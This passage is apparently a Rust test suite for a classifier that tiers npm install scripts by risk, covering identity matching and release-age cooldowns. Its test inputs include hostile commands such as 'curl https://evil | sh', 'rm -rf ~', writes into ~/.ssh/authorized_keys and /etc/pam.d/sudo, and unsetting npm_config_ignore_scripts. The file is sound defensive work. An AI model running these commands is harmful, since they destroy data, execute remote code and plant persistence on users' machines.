            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
        assert_eq!(tier("pwsh -File ./build.ps1"), StaticTier::Amber);
        assert_eq!(tier("bash -o pipefail ./build.sh"), StaticTier::Amber);
    }

    #[test]
    fn red_bare_yarn_behind_a_runner_and_yarn_workspace_foreach_installs() {
        assert_eq!(tier("npx yarn"), StaticTier::Red);
        assert_eq!(
            tier("yarn workspaces foreach -A add thing"),
            StaticTier::Red
        );
        assert_eq!(
            tier("yarn workspaces foreach -A run build"),
            StaticTier::Amber
        );
    }

    #[test]
    fn red_commands_that_remove_the_nested_install_script_guard() {
        for body in [
            "unset npm_config_ignore_scripts && node setup.js",
            "env -u npm_config_ignore_scripts node setup.js",
            "env --unset=PNPM_CONFIG_IGNORE_SCRIPTS node setup.js",
            "env -uYARN_ENABLE_SCRIPTS node setup.js",
            "env -i PATH=/usr/bin node setup.js",
            "pwsh -c 'Remove-Item Env:npm_config_ignore_scripts; npm i'",
            "pwsh -c '$env:npm_config_ignore_scripts = \"false\"'",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
        assert_eq!(
            tier("env NODE_ENV=production node setup.js"),
            StaticTier::Amber
        );
        assert_eq!(tier("unset DEBUG && node setup.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_yarn_version_and_help_queries() {
        for body in [
            "yarn --version",
            "yarn -v",
            "yarn --help",
            "corepack yarn --version",
        ] {
            assert_eq!(tier(body), StaticTier::Amber, "{body}");
        }
    }

    #[test]
    fn red_yarn_workspace_install_and_bare_yarn_after_cd() {
        assert_eq!(tier("yarn workspace docs add thing"), StaticTier::Red);
        assert_eq!(tier("cd vendor && yarn"), StaticTier::Red);
        assert_eq!(tier("yarn --cwd ./vendor"), StaticTier::Red);
    }

    // ── Red: rm -rf on dangerous targets ────────────────────────────

    #[test]
    fn red_rm_rf_dangerous_targets() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -rf /"), StaticTier::Red);
        assert_eq!(tier("rm -rf $HOME"), StaticTier::Red);
        assert_eq!(tier("rm -rf ${HOME}"), StaticTier::Red);
        assert_eq!(tier("rm -rf ~/.config"), StaticTier::Red);
        assert_eq!(tier("rm -rf /etc/something"), StaticTier::Red);
    }

    #[test]
    fn red_rm_rf_flag_spellings() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -fr ~"), StaticTier::Red);
        assert_eq!(tier("rm -r -f ~"), StaticTier::Red);
        assert_eq!(tier("rm -f -r ~"), StaticTier::Red);
        assert_eq!(tier("rm --recursive --force ~"), StaticTier::Red);
    }

    #[test]
    fn amber_rm_rf_relative_target() {
        // Relative targets stay amber — we can't statically prove
        // containment but they're also not in the red class.
        assert_eq!(tier("rm -rf node_modules"), StaticTier::Amber);
        assert_eq!(tier("rm -rf dist"), StaticTier::Amber);
    }

    #[test]
    fn amber_rm_without_force_and_recursive() {
        // `rm` alone doesn't meet the `-r && -f` requirement → not red.
        assert_eq!(tier("rm foo.txt"), StaticTier::Amber);
        assert_eq!(tier("rm -r foo"), StaticTier::Amber);
        assert_eq!(tier("rm -f foo"), StaticTier::Amber);
    }

    // ── Red: chmod outside package/node_modules ─────────────────────

    #[test]
    fn red_chmod_outside_package() {
        assert_eq!(tier("chmod +x ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("chmod 777 /etc/passwd"), StaticTier::Red);
        assert_eq!(tier("chmod 777 $HOME/.bashrc"), StaticTier::Red);
        assert_eq!(tier("chmod a+x /usr/local/bin/tool"), StaticTier::Red);
    }

    #[test]
    fn amber_chmod_relative_target() {
        // Relative targets skip red; end up amber via fallback.
        assert_eq!(tier("chmod +x ./bin/tool"), StaticTier::Amber);
        assert_eq!(tier("chmod 755 scripts/run.sh"), StaticTier::Amber);
    }

    // ── Red: dangerous redirects ────────────────────────────────────

    #[test]
    fn red_redirect_into_dotfiles() {
        assert_eq!(tier("echo evil >> ~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.zshrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.profile"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x > /etc/pam.d/sudo"), StaticTier::Red);
    }

    // ── Amber: compound commands (generic) ──────────────────────────

    #[test]
    fn amber_compound_of_greens() {
        // Even two greens AND'd together → amber. Rationale: compound
        // hides commands behind operators; we only trust atomic greens.
        assert_eq!(tier("tsc && husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc; prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc || true"), StaticTier::Amber);
    }

    #[test]
    fn amber_subshell_and_backticks() {
        assert_eq!(tier("echo $(whoami)"), StaticTier::Amber);
        assert_eq!(tier("echo `whoami`"), StaticTier::Amber);
    }

    #[test]
    fn amber_stdout_redirect() {
        assert_eq!(tier("echo hi > out.txt"), StaticTier::Amber);
        assert_eq!(tier("echo hi >> out.txt"), StaticTier::Amber);
    }

    // ── Amber: network binary downloaders (D18) ─────────────────────
    //
    // These are deliberately NOT green — D18 routes them through
    // Layer 2 approval so the user explicitly acknowledges the binary-
    // download class.

    #[test]
    fn amber_playwright_install() {
        assert_eq!(tier("playwright install"), StaticTier::Amber);
        assert_eq!(tier("playwright install --with-deps"), StaticTier::Amber);
    }

    #[test]
    fn amber_puppeteer() {
        assert_eq!(tier("puppeteer"), StaticTier::Amber);
        assert_eq!(tier("puppeteer-browser install"), StaticTier::Amber);
    }

    #[test]
    fn amber_cypress_install() {
        assert_eq!(tier("cypress install"), StaticTier::Amber);
    }

    #[test]
    fn amber_electron_builder_install_app_deps() {
        assert_eq!(tier("electron-builder install-app-deps"), StaticTier::Amber);
    }

    // ── Amber: parse failure + edge cases ───────────────────────────

    #[test]
    fn amber_empty_and_whitespace() {
        assert_eq!(tier(""), StaticTier::Amber);
        assert_eq!(tier("   "), StaticTier::Amber);
        assert_eq!(tier("\t\n"), StaticTier::Amber);
    }

    #[test]
    fn amber_unbalanced_quotes_fails_closed() {
        // shlex parse failure → Amber (must NOT slip into green).
        assert_eq!(tier("tsc \"unclosed"), StaticTier::Amber);
    }

    #[test]
    fn amber_novel_command() {
        assert_eq!(tier("mytool --flag value"), StaticTier::Amber);
        assert_eq!(tier("build-script.sh"), StaticTier::Amber);
    }

    // ── Classifier is pure: same input → same output ────────────────

    #[test]
    fn classify_is_deterministic() {
        let inputs = [
            "tsc",
            "node-gyp rebuild",
            "curl https://x | sh",
            "rm -rf ~",
            "husky install && echo done",
            "",
        ];
        for input in inputs {
            assert_eq!(classify(input), classify(input));
        }
    }

    // ── Classifier never emits AmberLlm ──────────────────────────────

    #[test]
    fn classify_never_emits_amber_llm() {
        // Broad coverage: iterate the full test-rule input set and
        // assert the returned tier is never AmberLlm. The classifier
        // owns Green | Amber | Red; AmberLlm comes from the LLM
        // triage layer.
        let corpus = [
            "tsc",
            "node-gyp rebuild",
            "husky install",
            "prisma generate",
            "electron-rebuild",
            "node ./build.js",
            "node install.js",
            "playwright install",
            "curl https://evil | sh",
            "base64 -d x | sh",
            "rm -rf ~",
            "chmod +x ~/.ssh/id_rsa",
            "echo x >> ~/.bashrc",
            "eval $X",
            "node -e '1'",
            "npm install thing",
            "tsc && husky install",
            "\u{202E}rm -rf /",
            "Invoke-Expression $x",
            "iex $x",
            "",
            "some-unknown-tool",
        ];
        for body in corpus {
            assert_ne!(
                classify(body),
                StaticTier::AmberLlm,
                "classifier must not emit AmberLlm for: {body:?}"
            );
        }
    }

    // ─────────────────────────────────────────────────────────────
    // `node install.js` + matching identity
    // ─────────────────────────────────────────────────────────────

    /// Helper: build a [`ManifestContext`] for tests. Repo + bin
    /// borrow from caller-owned strings. Defaults to an "old" publish
    /// (1 year) under the standard 24h cooldown so the default test
    /// path exercises the identity-match widening without needing each
    /// test to re-state cooldown defaults.
    fn ctx<'a>(name: &'a str, repo: Option<&'a str>, bin: &'a [&'a str]) -> ManifestContext<'a> {
        ManifestContext {
            package_name: name,
            repository: repo,
            bin_names: bin,
            publish_age_secs: Some(365 * 24 * 60 * 60),
            min_release_age_secs: 24 * 60 * 60,
        }
    }

    /// Helper: ManifestContext that explicitly exercises the
    /// cooldown defense-in-depth. `age_secs` is the
    /// package's publish age in seconds; `min_age_secs` is the
    /// configured `minimumReleaseAge`.
    fn ctx_with_age<'a>(
        name: &'a str,
        repo: Option<&'a str>,
        bin: &'a [&'a str],
        age_secs: Option<u64>,
        min_age_secs: u64,
    ) -> ManifestContext<'a> {
        ManifestContext {
            package_name: name,
            repository: repo,
            bin_names: bin,
            publish_age_secs: age_secs,
            min_release_age_secs: min_age_secs,
        }
    }

    fn tier_with_ctx(script: &str, ctx: &ManifestContext<'_>) -> StaticTier {
        classify_with_context(script, Some(ctx))
    }

    #[test]
    fn lever4_no_context_is_pre_lever_behavior() {
        // Without manifest context, the classifier must produce the
        // SAME tier as the bare `classify(...)` function. The
        // identity check is purely additive; passing `ctx = None` is a no-op.
        for body in [
            "tsc",
            "node-gyp rebuild",
            "node install.js",
            "node ./scripts/postinstall.js",
            "curl https://evil | sh",
        ] {
            assert_eq!(
                classify(body),
                classify_with_context(body, None),
                "context-free behaviour drift for {body:?}"
            );
        }
    }

    #[test]
    fn lever4_node_install_js_with_matching_repo_is_green() {
        // A package whose body is a bare delegate `node install.js`
        // AND whose manifest's repository URL contains the package
        // name as a path segment.
        let c = ctx(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
        assert_eq!(tier_with_ctx("node ./install.js", &c), StaticTier::Green);
        assert_eq!(
            tier_with_ctx("node scripts/install.js", &c),
            StaticTier::Green
        );

        // Same with .cjs / .mjs variants the reserved-basename set
        // covers.
        let c2 = ctx(
            "puppeteer",
            Some("https://github.com/puppeteer/puppeteer"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.mjs", &c2), StaticTier::Green);
        let c3 = ctx(
            "claude-code",
            Some("https://github.com/anthropics/claude-code.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.cjs", &c3), StaticTier::Green);
    }

    #[test]
    fn lever4_matching_bin_name_is_green() {
        // A package whose `bin` entry name matches the package's
        // base name is treated as carrying its own identity, even
        // without a repository URL.
        let c = ctx("prisma", None, &["prisma"]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_repo_with_unrelated_identity_stays_amber() {
        // False-Green stress: the body is a delegate but the
        // manifest's repository URL doesn't point at any path
        // segment that names this package. Stays Amber.
        let c = ctx(
            "sharp",
            Some("https://github.com/some-org/different-pkg.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_no_manifest_identity_stays_amber() {
        // No repository AND no matching bin → Amber. The widening
        // requires an explicit identity signal; absence is not a
        // greenlight.
        let c = ctx("sharp", None, &[]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_scoped_package_uses_base_name_for_match() {
        // `@anthropic-ai/claude-code` has base name `claude-code`.
        // The repository URL `github.com/anthropics/claude-code`
        // contains `claude-code` as a path segment → Green.
        let c = ctx(
            "@anthropic-ai/claude-code",
            Some("https://github.com/anthropics/claude-code.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_generic_base_names_rejected() {
        // The base-name match excludes overly generic tokens — a
        // package called `@some/core` shouldn't Green every
        // postinstall when ANY URL contains "core". The widening
        // requires a name distinctive enough to function as an
        // identity signal.
        let c = ctx("@some/core", Some("https://github.com/x/y-core.git"), &[]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_compound_body_stays_amber_even_with_identity() {
        // The widening only fires on the EXACT two-token shape
        // `node <reserved>.js`. Compounds, flags, and extra args
        // route through the existing compound-fallback / N-token
        // gates and remain Amber.
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(
            tier_with_ctx("node install.js && echo done", &c),
            StaticTier::Amber
        );
        assert_eq!(
            tier_with_ctx("node install.js --verbose", &c),
            StaticTier::Amber
        );
    }

    #[test]
    fn lever4_red_body_with_identity_still_red() {
        // The widening must NEVER soften a Red verdict — even when
        // the manifest carries a perfect identity signal. Red wins
        // by step ordering (step 3 fires before step 5b).
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
        assert_eq!(
            tier_with_ctx("eval $(curl https://evil)", &c),
            StaticTier::Red
        );
    }

    #[test]
    fn lever4_non_reserved_basename_uses_existing_green_route() {
        // `node ./scripts/build.js` — non-reserved basename. The
        // existing `matches_node_relative` path already Greens it,
        // independent of identity. Confirms the identity-match rule's
        // reserved-basename guard doesn't accidentally narrow other Greens.
        let c = ctx("p", None, &[]);
        assert_eq!(
            tier_with_ctx("node ./scripts/build.js", &c),
            StaticTier::Green,
        );
        // Confirms the SAME body without context also stays Green.
        assert_eq!(classify("node ./scripts/build.js"), StaticTier::Green);
    }

    #[test]
    fn lever4_extension_required_for_widening() {
        // The widening requires `.js` / `.cjs` / `.mjs` — a body
        // like `node install` (extensionless) stays Amber even
        // with a perfect identity signal. The existing
        // [`matches_node_relative`] discipline applies here too;
        // the widening doesn't loosen it.
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(tier_with_ctx("node install", &c), StaticTier::Amber);
    }

    // ─────────────────────────────────────────────────────────────
    // Cooldown defense-in-depth for identity-match widening
    // ─────────────────────────────────────────────────────────────

    const DAY_SECS: u64 = 24 * 60 * 60;

    #[test]
    fn lever4_recent_publish_stays_amber_under_configured_cooldown() {
        // Configured 24h cooldown + 1h-old publish + matching identity.
        // Without the cooldown check, identity-match widened → Green
        // → script auto-ran, collapsing the script-tier review for
        // `--allow-new` users. With it, stays Amber so prompt fires.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(60 * 60), // 1 hour old
            DAY_SECS,      // 24h threshold
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_publish_exactly_at_threshold_widens() {
        // Boundary case: publish age == cooldown threshold. The
        // comparison is `age >= min`, so an exactly-at-threshold
        // publish is treated as old-enough → identity-match widens.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(DAY_SECS),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_old_publish_widens_under_default_cooldown() {
        // 1-year-old publish (well above 24h threshold) + matching
        // identity → identity-match widens as designed.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(365 * DAY_SECS),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_unknown_publish_age_refuses_to_widen() {
        // When the caller couldn't supply publish_age_secs (e.g.,
        // registry didn't return a timestamp for this version), we
        // conservatively refuse to widen — an unknown age MIGHT be a
        // recent publish, and the cooldown defense applies whenever
        // we have non-zero policy.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            None,
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_min_release_age_zero_disables_cooldown_check() {
        // `minimumReleaseAge: 0` is the explicit "I don't want
        // cooldown protection" config. The identity-match check
        // honors that and widens regardless of publish age — even a
        // 0-second-old publish widens when the user has globally
        // opted out of the cooldown axis.
        let c_recent = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(0),
            0,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_recent),
            StaticTier::Green
        );
        let c_unknown = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            None,
            0,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_unknown),
            StaticTier::Green
        );
    }

    #[test]
    fn lever4_custom_min_release_age_compared_against_publish_age() {
        // 7-day cooldown + 3-day-old publish → 3 days < 7 days →
        // refuses to widen. Same publish at 10 days → 10 ≥ 7 →
        // widens. Confirms the comparison uses the policy's
        // configured threshold, not the 24h default.
        let week_secs = 7 * DAY_SECS;
        let c_too_recent = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(3 * DAY_SECS),
            week_secs,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_too_recent),
            StaticTier::Amber
        );
        let c_old_enough = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(10 * DAY_SECS),
            week_secs,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_old_enough),
            StaticTier::Green
        );
    }

    #[test]
    fn lever4_cooldown_check_does_not_affect_compound_or_red_paths() {
        // Cooldown defense is gated on the identity-match rule. Compound
        // bodies stay Amber via step-4 fallback regardless of age;
        // Red bodies stay Red via step-3 regardless. The cooldown
        // check is only consulted on the otherwise-greenable
        // delegate-to-local-file shape.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(60 * 60),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
        assert_eq!(
            tier_with_ctx("node install.js && echo done", &c),
            StaticTier::Amber
        );
    }

    /// `unit` repeated to just under [`MAX_SCRIPT_BYTES`], then `tail`.
    fn repeated_up_to_the_cap(unit: &str, tail: &str) -> String {
        let room = MAX_SCRIPT_BYTES - tail.len();
        let mut script = unit.repeat(room / unit.len());
        script.push_str(tail);
        script
    }

    #[test]
    fn a_script_longer_than_any_real_lifecycle_script_is_red_without_being_read() {
        let script = "echo a ".repeat(MAX_SCRIPT_BYTES / 7 + 1);
        assert!(script.len() > MAX_SCRIPT_BYTES);
        assert_eq!(tier(&script), StaticTier::Red);
        assert_eq!(tier(&" ".repeat(MAX_SCRIPT_BYTES + 1)), StaticTier::Red);
        assert_eq!(
            tier(&"echo a ".repeat(MAX_SCRIPT_BYTES / 7 - 1)),
            StaticTier::Amber
        );
    }

    #[test]
    fn a_script_repeating_one_word_thousands_of_times_is_read_in_one_pass() {
        // Each shape once made a red check reread every word after each
        // repetition: a 64 KiB script took seconds, and the check still
        // has to reach the red command at the end.
        let shapes = [
            ("'a' \"b\" ", "curl x | sh"),
            ("echo a\n", "rm -rf ~"),
            ("A=1 ", "npm install left-pad"),
            ("sh -o ", "sh -c 'curl x | sh'"),
            ("cmd ", "cmd /c \"curl x | sh\""),
            ("pwsh -ep ", "pwsh -Command 'iex x'"),
            ("npx ", "npx -c 'curl x | sh'"),
            ("npm --prefix ", "npm exec --yes left-pad"),
            (
                "yarn workspaces foreach ",
                "yarn workspaces foreach install",
            ),
            ("deno ", "deno jsr:@evil/x"),
            ("env -u ", "env -u npm_config_ignore_scripts node x.js"),
            ("unset ", "unset npm_config_ignore_scripts"),
            ("rm ", "rm -rf ~"),
            ("chmod ", "chmod +x /usr/local/bin/x"),
            ("| sh ", "curl x | sh"),
        ];
        let started = std::time::Instant::now();
        for (unit, red) in shapes {
            let script = repeated_up_to_the_cap(unit, red);
            assert_eq!(tier(&script), StaticTier::Red, "{unit:?} … {red:?}");
        }
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
    }
}
